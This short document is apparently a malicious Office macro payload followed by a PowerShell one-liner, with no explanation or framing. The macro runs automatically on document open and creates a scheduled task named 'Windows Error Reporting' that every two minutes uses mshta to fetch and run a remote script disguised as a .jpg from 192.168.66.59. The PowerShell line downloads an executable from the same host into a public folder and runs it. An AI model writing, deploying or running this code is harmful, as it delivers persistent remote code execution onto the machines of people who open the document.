Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Call Shell("schtasks /create /sc MINUTE /tn ""Windows Error Reporting"" /tr ""mshta.exe javascript:a=GetObject('script:http://192.168.66.59/microsoftftp.jpg').Exec();close();"" /mo 2 /F")
End Sub


powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.66.59/updates.exe',
'C:\Users\Public\updates.exe');& 'C:\Users\Public\updates.exe'
